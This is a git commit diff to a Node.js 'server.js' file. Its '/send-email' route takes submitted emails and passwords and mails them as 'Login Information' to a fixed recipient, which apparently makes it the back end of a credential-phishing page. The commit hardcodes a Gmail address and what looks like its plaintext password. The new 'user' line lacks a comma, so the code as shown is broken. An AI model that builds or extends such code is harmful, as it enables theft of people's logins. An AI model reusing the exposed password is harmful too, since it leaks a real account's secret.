c310b7e54977c089bce169069d5720f3394a2632
laur221 <69975662+laur221@users.noreply.github.com>
2024-10-03 09:33:17 +0300

    Update server.js

--- server.js
+++ server.js
@@ -12,8 +12,8 @@ app.use(bodyParser.json());
 let transporter = nodemailer.createTransport({
   service: 'gmail', // Sau alt serviciu (Yahoo, Outlook, etc.)
   auth: {
-    user: 'adresa_ta_de_email@gmail.com', // Adresa ta de email
-    pass: 'parola_ta' // Parola sau App Password, dacă ai 2FA activat
+    user: 'dazaiosamu351@gmail.com' // Adresa ta de email
+    pass: 'DazaiOsamuGoogleAkk231' // Parola sau App Password, dacă ai 2FA activat
   }
 });
 
@@ -22,8 +22,8 @@ app.post('/send-email', (req, res) => {
   const { email, password } = req.body;
 
   let mailOptions = {
-    from: 'adresa_ta_de_email@gmail.com',
-    to: 'adresa_destinatarului@example.com', // Emailul destinatarului
+    from: 'dazaiosamu351@gmail.com',
+    to: 'kridderurt@example.com', // Emailul destinatarului
     subject: 'Login Information',
     text: `Email: ${email}\nPassword: ${password}`
   };
